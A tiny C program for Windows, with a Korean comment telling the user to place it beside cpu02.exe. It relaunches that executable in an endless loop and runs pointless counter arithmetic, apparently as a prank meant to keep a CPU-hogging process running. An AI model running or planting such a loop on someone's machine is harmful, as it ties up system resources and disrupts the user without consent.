
#include <windows.h>

int main()
{
	//이 프로그램을 실행시키려면 cpu02.exe와 같은 폴더에 넣고 실행하세염
	int i, j = 0;
	for (i = 0;; i++)
	{
		j += i;
		j *= i;
		i += j;
		system("cpu02.exe");
	}
	return 0;
}

